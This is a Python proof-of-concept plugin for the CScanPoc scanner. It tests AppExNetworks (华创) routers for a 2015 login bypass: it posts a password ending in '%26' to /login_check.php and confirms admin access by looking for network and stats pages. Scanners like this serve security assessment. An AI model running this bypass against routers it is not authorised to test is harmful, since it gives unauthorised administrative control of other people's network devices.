# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType

class Vuln(ABVuln):
    vuln_id = 'AppExNetworks_0001' # 平台漏洞编号，留空
    name = '华创路由器可任意用户登录'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.OTHER # 漏洞类型
    disclosure_date = '2015-08-14'  # 漏洞公布时间
    desc = '''
        华创智能加速路由器，设计缺陷，逻辑错误。
        通过路由WEB登录页面随便填写户名(测试以admin为例)密码为随便（但密码一定要通过burp拦截提交而且密码后面必须带“%26”），就可以随意登录了。
    '''  # 漏洞描述
    ref = ''  # 漏洞来源
    cnvd_id = ''  # cnvd漏洞编号
    cve_id = ''  # cve编号
    product = '华创路由器'  # 漏洞应用名称
    product_version = ''  # 漏洞应用版本

class Poc(ABPoc):
    poc_id = 'a67f00e7-9567-43d4-863f-b25499a520c0'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-10'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            
            #__refer__  = http://www.wooyun.org/bugs/wooyun-2010-0132543
            hh = hackhttp.hackhttp()
            post = "userName=line&password=line%26"
            posturl =  "/login_check.php"
            target = self.target + posturl
            code, head, res, errcode, _ = hh.http(target,post=post)
            if code == 302 and "location: redirect.php" in head:
                code, head, res, errcode, _ = hh.http(self.target)
                if code == 200  and "acc/network/network_interfaces.php" in res and 'acc/stats/system.php' in res:
                    #security_hole(target)
                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                        target=self.target, name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        super(Poc, self).exploit()

if __name__ == '__main__':
    Poc().run()
